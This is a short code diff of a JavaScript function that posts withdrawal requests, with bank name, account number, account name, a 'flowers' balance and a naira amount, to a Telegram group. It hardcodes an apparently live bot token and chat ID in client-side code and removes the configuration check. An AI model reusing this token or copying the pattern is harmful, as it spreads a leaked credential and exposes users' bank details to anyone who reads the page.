@@ -304,14 +304,8 @@
         }
 
         function sendTelegramNotification(bank, accNo, accName, flowers, naira) {
-            // Your Telegram Bot Token and Group Chat ID
-            const TELEGRAM_BOT_TOKEN = "7927840249:AAG...your_token_here"; // Replace or ensure your token is correct
+            const TELEGRAM_BOT_TOKEN = "8524825030:AAEpGVofXlPtYyvaZnvVHu-BYnjC4DqGZr8"; 
             const TELEGRAM_CHAT_ID = "-1003949521064";
-
-            if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes("your_token_here")) {
-                console.log("Telegram Token not configured properly.");
-                return;
-            }
 
             const message = `<b>🔔 New Withdrawal Request</b>\n\n` +
                             `🌸 <b>Flowers:</b> ${flowers.toLocaleString()}\n` +
